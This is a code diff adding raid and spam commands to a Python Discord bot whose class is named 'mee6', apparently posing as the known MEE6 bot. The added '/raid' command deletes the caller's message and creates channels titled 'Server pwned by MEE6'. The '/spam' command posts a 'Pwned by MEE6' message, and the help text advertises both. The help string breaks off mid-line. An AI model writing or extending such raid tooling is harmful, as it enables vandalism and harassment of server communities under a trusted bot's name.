@@ -16,8 +16,26 @@ class mee6(discord.Client):
 
 
     async def on_message(self, message):
+        if message.content.startswith('/raid'):
+            currentguild = message.guild
+            await message.delete()
+            await self.create_channel(currentguild, 'Server pwned by MEE6 :)', type=discord.ChannelType.text)
+            await self.create_channel(currentguild, 'Server pwned by MEE6 ;)', type=discord.ChannelType.text)
+            await self.create_channel(currentguild, 'Server pwned by MEE6 .)', type=discord.ChannelType.text)
+            
+            
+        if message.content.startswith('/spam'):
+            await message.delete()
+            await message.channel.send("Pwned by MEE6 :)")
+            
+            
         if message.content.startswith('/help'):
-            await message.channel.send("test")
+            await message.delete()
+            await message.channel.send("""MEE6 commands help
+- /help: get all commands
+- /raid: create a lot of channels
+- /spam <message>: spam a message in current channel
+- /""")
 
 
 intents = discord.Intents.default()
